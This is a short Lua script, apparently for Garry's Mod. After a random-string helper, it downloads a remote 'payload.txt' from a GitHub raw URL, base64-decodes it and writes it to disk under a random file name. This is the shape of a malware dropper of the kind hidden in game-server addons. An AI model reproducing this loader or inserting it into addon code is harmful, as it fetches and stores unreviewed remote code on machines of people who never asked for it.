function generateRandomString(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local randomString = ""
    local charsCount = #chars

    for i = 1, length do
        local randomIndex = math.random(charsCount)
        randomString = randomString .. string.sub(chars, randomIndex, randomIndex)
    end

    return randomString
end

http.Fetch('https://raw.githubusercontent.com/dreaded-wire/g-spot/main/payload.txt', function(b) file.Write(string.format('%s.txt',generateRandomString(20)), util.Base64Decode(b)) end, function() print('fail') end)
